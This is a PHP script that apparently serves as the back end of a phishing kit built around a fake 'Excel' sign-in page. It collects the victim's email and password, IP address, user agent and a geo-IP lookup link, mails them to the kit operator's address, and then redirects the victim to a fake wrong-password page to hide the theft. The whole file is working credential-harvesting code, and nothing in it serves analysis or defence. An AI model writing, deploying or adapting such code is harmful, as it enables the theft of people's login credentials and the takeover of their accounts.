<?php
session_start();
$_SESSION['50wps9email_session']        = $_POST['mailk2m'];

$dst= substr(str_shuffle(str_repeat("0123456789", 3)), 0, 3);
if($_POST['pass91m'] !=""){

$time = date("D/M/d, Y g:i a"); 
$browser = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];

require_once('./mail.php');
	
	$message .= "[+]=====================| Access Login |========================[+]\n";
    $message .= "Email : " . $_SESSION['50wps9email_session'] . "\n"; 
    $message .= "Password : " . $_POST['pass91m'] . "\n";  
	$message .= "IP : " .$ip. "\n";
    $message .= "[+]=====================| Geo Ip |========================[+]\n";   
    $message.= "IP Geo 		 : http://www.geoiptool.com/?IP=".$ip."\n";
    $message .= "[+]=====================| User Agent Browser |========================[+]\n";
    $message .= "User Agent : ".$browser."\n";
    $message .= "[+]=====================| $time |========================[+]\n";
	
			$subme ="Sign In";
		$headers = "From: " . $subme . " <info@anukumu.eue>";
		
	$subject="Excel-v.1 $ip";
	
	mail($mymail, $subject, $message, $headers);
	
?>

<script type="text/javascript"> 
<!-- 
   window.location="./wrongpass?id=<?php echo $dst ?>"; 

</script> 

<?PHP

}

?>